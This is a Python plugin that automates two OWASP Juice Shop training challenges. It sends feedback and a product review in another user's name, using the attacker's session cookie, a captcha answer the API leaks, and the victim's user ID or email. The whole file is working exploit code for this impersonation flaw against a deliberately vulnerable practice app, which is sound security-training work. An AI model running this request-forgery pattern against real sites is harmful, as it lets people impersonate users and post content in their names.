# SOURCE FILE:    forged.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve FORGED FEEDBACK & FORGED REVIEW Challenge
#                 1. using attacker's credential to change victim's product review
#                 2. using attacker's credential to change victim's feedback
#
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
#--------------------------------------------------------------------------------------
"""
This file is to automate the OWASP JUICESHOP TASK
FORGED FEEDBACK
FORGED REVIEW
The basic idea behind is to give a feedback/review in the name of other people
We will use user A's header and cookie to send post with username B
"""

import time
from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#--------------------------------------------------------------------------------------
#Class: forged
#Inherit: attack_inter
#--------------------------------------------------------------------------------------
class forged(a.attack_inter):

#--------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#--------------------------------------------------------------------------------------
    def __init__(self, aEmail, vEmail):
        # REST session
        self.juice_session = a.requests.session()
        # attacker's email address
        self.email = aEmail
        # victim's email address
        self.victim_email = vEmail
        # fake comment
        self.comment = 'I like orange Juice'
        # fake rating
        self.rating = 5
        # attacker's ID
        self.userid = a.get_userId(self.email)
        # victim's ID
        self.forgeId = a.get_userId(self.victim_email)
        # attacker's credential
        self.cookie, self.header = a.get_auth(self.email)
        # captcha credential
        self.captchaId, self.captcha, self.captchaAns = self.load_captcha()

    def generator(self):
        pass

#--------------------------------------------------------------------------------------
#FUNCTION load_captcha
#ARGUMENTS: N/A
#RETURNS: list[captchaId, captcha, answer]
#Description: Send a GET request to get captcha info and answer to pass verification
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def load_captcha(self):
        print('-----------------------------------------')
        print('Let us get the captcha ------------------')
        url = a.URL + '/rest/captcha/'
        response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
        return response.json()["captchaId"], response.json()["captcha"], response.json()["answer"]

#--------------------------------------------------------------------------------------
#FUNCTION load_captcha
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: Send a POST request to change victim's feedback content
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def forged_feedback(self):
        print("------------------------------------------")
        print("Let us forge other's feedback ------------")
        url = a.URL + '/api/Feedbacks/'
        json_data = {
            'UserId': self.forgeId,
            'captchaId': self.captchaId,
            'captcha': self.captchaAns,
            'comment': self.comment,
            'rating': self.rating,
        }
        response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)
        if response.status_code == 201:
            print("The original user has id")
            print(self.userid)
            print("The forged user has id")
            print(self.forgeId)
            print(response.json()["data"])
        print(response.status_code)

#--------------------------------------------------------------------------------------
#FUNCTION load_captcha
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: Send a POST request to change victim's product review
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def forged_review(self):
        print("------------------------------------------")
        print("Let us forge other's review --------------")
        url = a.URL + '/rest/products/{}/reviews'.format(self.forgeId)
        json_data = {
            'message': 'I like orange Juice',
            'author': self.victim_email,
        }
        response = self.juice_session.put(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin.
#             
#NOTES: None
#--------------------------------------------------------------------------------------
    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        a.logging.info('#Forged Feedback Started')
        self.forged_feedback()
        a.logging.info('#Forged Feedback Finshed')

        a.logging.info('#Forged Review Started')
        self.forged_review()
        a.logging.info('#Forged Review Finshed')



